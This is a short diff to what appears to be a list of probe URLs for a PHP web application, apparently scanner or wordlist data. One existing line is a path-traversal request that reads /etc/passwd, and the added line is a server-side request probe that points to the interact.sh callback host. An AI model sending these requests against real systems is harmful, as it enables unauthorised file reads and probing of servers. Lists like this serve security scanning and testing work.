@@ -1,2 +1,3 @@
 /index.php/admin/filemanager/sa/getZipFile?path=/../../../../../../../etc/passwd
 /index.php?r=installer/welcome
+/index.php?r=editorLink&url=http://interact.sh/
